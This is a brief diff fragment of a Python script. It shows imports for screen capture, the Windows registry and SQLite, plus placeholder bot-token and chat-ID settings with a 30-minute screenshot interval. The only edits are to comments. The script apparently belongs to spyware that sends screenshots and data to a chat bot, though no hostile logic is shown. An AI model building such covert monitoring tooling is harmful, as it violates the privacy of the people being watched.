@@ -1,3 +1,4 @@
+# DBER LKREK 
 import os
 import json
 import sqlite3
@@ -14,7 +15,7 @@ from mss import mss
 import getpass
 import winreg
 
-# ===== CONFIGURATION =====
+#  CONFIGURATION HHHHHHHH 
 BOT_TOKEN = "..........................................."
 CHAT_ID = "................."
 SCREENSHOT_INTERVAL = 1800  # 30 minutes in seconds
